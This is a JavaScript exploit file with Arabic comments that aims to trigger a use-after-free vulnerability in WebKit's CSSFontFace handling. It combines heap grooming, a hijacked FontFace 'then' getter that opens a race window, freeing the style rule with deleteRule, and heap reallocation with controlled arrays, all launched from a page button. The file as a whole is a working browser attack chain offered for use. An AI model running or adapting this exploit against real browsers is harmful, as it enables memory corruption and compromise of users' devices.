/**
 * [ARCHITECT MODE] - CSSFontFace UAF Exploit Logic
 * المطور: Janus & Tesavek
 * الوظيفة: إثارة ثغرة الـ Use-After-Free داخل ملف inject.js الخاص بالإطار المرفوع
 */

// التأكد من ربط التابع بـ الواجهة البرمجية للإطار
ssa("[*] بدء تحميل نظام تحليل الذاكرة واستغلال ثغرة CSSFontFace...");

function triggerWebKitUAF() {
    try {
        // 1. مرحلة إعداد البيئة (Heap Grooming)
        ssa("[*] المرحلة 1: تهيئة كائنات مصفوفات الـ JS لاحتلال كتل الذاكرة الحرة...");
        let heapStructureSpray = [];
        for (let i = 0; i < 200; i++) {
            // إنشاء كائنات بهياكل برمجية محددة لمحاكاة ترويسة الـ JSCell
            heapStructureSpray.push({
                cellHeader: 0x01000000, 
                butterflyFake: i, 
                padding: [1.1, 2.2, 3.3]
            });
        }

        // 2. تفعيل الثغرة عبر الـ @font-face
        ssa("[*] المرحلة 2: حقن قاعدة خط غير موجودة لإجبار المحرك على الانتظار الحرج...");
        const styleElement = document.createElement('style');
        styleElement.id = 'vulnerable_style';
        styleElement.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
        document.head.appendChild(styleElement);

        // 3. إنشاء كائن الوجه وبدء الـ DeferredPromise
        let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(A);
        void A.loaded; // تفعيل حالة الوعي بالكائن داخل المتصفح

        let fired = false;

        // 4. قلب الثغرة: اعتراض الـ Thenable Getter لكسر التزامن
        ssa("[*] المرحلة 3: اعتراض التابع FontFace.prototype.then لإحداث الـ Race Condition...");
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                if (!fired && this === A) {
                    fired = true;
                    ssa("[!!] [RACE_CONDITION] تم التقاط لحظة الدخول للـ Getter الفاقد للمرجع!");

                    // أ: حجز مكثف لتأكيد استغلال الذاكرة الحرة (ASAN Defeat Mimic)
                    let temporaryHolders = [];
                    for(let j = 0; j < 50; j++) {
                        temporaryHolders.push(new FontFace('spray_' + j, 'local(Arial)', { unicodeRange: 'U+0041' }));
                    }

                    // ب: إزالة القاعدة - تحرير كائن CSSFontFace الفعلي من الذاكرة (The Free Phase)
                    ssa("[!] [THE_FREE] استدعاء deleteRule(0) لتحرير الكائن الأساسي...");
                    document.getElementById('vulnerable_style').sheet.deleteRule(0);

                    // ج: فرض إعادة حساب التنسيق فوراً لإجبار المحرك على مسح الذاكرة الحرة
                    ssa("[*] فرض عملية تحديث التنسيق المتزامن عبر Layout Reflow...");
                    let forceLayoutUpdate = document.body.offsetTop;

                    // د: إعادة بناء الهيكل (The Reallocation Window)
                    ssa("[+] [REALLOCATION] ملء الكتلة الذاكرية المحررة ببنية كائن جافا سكريبت متحكم به...");
                    for (let k = 0; k < 100; k++) {
                        // حجز مصفوفات عادية تتداخل مع الـ Butterfly
                        let fakeButterflyArray = [1.1, 2.2, 3.3, 4.4];
                        fakeButterflyArray.fixedProperty = 0xDEADBEEF;
                    }
                }
                return undefined;
            }
        });

        // 5. إطلاق عملية التحميل التي ستمر عبر الفجوة الزمنية
        ssa("[*] المرحلة 4: استدعاء دالة التحميل المتقاطع لإثارة الخلل منطقياً...");
        document.fonts.load('1em x', 'AB');

        // التحقق النهائي من بقاء الـ WebProcess مستقراً أو حدوث تداخل
        setTimeout(() => {
            ssa("[+] تم الانتهاء من تنفيذ سلسلة الاستغلال، تفقد حالة استقرار الذاكرة.");
        }, 100);

    } catch (error) {
        ssa("[-] خطأ أثناء تشغيل الثغرة داخل سياق المستخدم: " + error.message);
    }
}

// ربط تشغيل الثغرة بزر التنفيذ الأساسي المفرود في index.html
document.getElementById('exec-btn').addEventListener('click', function() {
    ssa("[*] تم الضغط على زر البدء... إطلاق الثغرة الحقيقية:");
    triggerWebKitUAF();
});
